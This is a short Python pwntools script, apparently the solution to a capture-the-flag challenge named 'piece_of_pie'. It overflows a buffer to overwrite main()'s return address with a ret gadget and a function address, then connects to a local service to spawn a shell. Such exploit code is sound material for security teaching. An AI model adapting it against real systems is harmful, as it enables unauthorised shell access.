#!/usr/bin/env python3

"""
Solution (exploit) for piece_of_pie challenge.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

exec_file = "../public/piece_of_pie"
binary = ELF(exec_file)

rop = ROP(binary)
ret_gadget = rop.find_gadget(['ret'])[0]

offset = 40
function_address = binary.symbols[b"make_it_easy"]

payload = 40 * b'A' + p64(ret_gadget) + p64(function_address)

local = False
if local:
    io = process(exec_file)
else:
    HOST = "localhost"
    PORT = 31337
    io = remote(HOST, PORT)

msg = io.recvuntil(b': ')
io.sendline(payload)
io.interactive()
